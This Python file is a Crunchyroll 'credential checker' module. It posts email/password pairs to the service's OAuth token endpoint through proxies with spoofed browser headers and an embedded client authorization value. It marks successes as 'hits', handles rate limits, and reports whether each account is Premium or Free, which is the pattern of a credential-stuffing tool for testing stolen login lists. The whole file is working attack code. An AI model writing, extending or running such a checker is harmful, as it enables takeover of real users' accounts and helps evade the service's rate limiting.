"""
crunchyroll.py — Crunchyroll credential checker module.
"""

import requests
from scripts import get_proxy_dict


def check(email: str, password: str, proxies: list[str] = None) -> dict:
    """
    Check Crunchyroll credentials via API auth.
    Returns {status: 'hit'|'fail'|'error'|'ratelimit', detail: str}
    """
    session = requests.Session()
    proxy = get_proxy_dict(proxies) if proxies else None

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Origin": "https://www.crunchyroll.com",
        "Referer": "https://www.crunchyroll.com/",
    }

    try:
        auth_data = {
            "username": email,
            "password": password,
            "grant_type": "password",
            "scope": "offline_access",
        }

        # Basic auth header for Crunchyroll's OAuth client
        auth_headers = {
            **headers,
            "Authorization": "Basic YXByb2RfNzVhYmUyYzAtMDQ3Mi00YjQwLWExMDctY2Y5OWM1ZGVkZGEy",
        }

        resp = session.post(
            "https://beta-api.crunchyroll.com/auth/v1/token",
            headers=auth_headers, data=auth_data,
            proxies=proxy, timeout=10
        )

        if resp.status_code == 200:
            body = resp.json()
            if body.get("access_token"):
                # Try to get account info
                acc_headers = {
                    "Authorization": f"Bearer {body['access_token']}",
                    "User-Agent": headers["User-Agent"],
                }
                acc_resp = session.get(
                    "https://beta-api.crunchyroll.com/accounts/v1/me",
                    headers=acc_headers, proxies=proxy, timeout=10
                )
                detail = "Premium" if "premium" in acc_resp.text.lower() else "Free"
                return {"status": "hit", "detail": f"Account type: {detail}"}
            else:
                return {"status": "fail", "detail": "No token returned"}

        elif resp.status_code == 401:
            return {"status": "fail", "detail": "Invalid credentials"}

        elif resp.status_code == 429 or resp.status_code == 403:
            return {"status": "ratelimit", "detail": "Rate limited"}

        else:
            return {"status": "error", "detail": f"HTTP {resp.status_code}"}

    except requests.exceptions.Timeout:
        return {"status": "error", "detail": "Timeout"}
    except requests.exceptions.ProxyError:
        return {"status": "error", "detail": "Proxy error"}
    except Exception as exc:
        return {"status": "error", "detail": str(exc)[:60]}
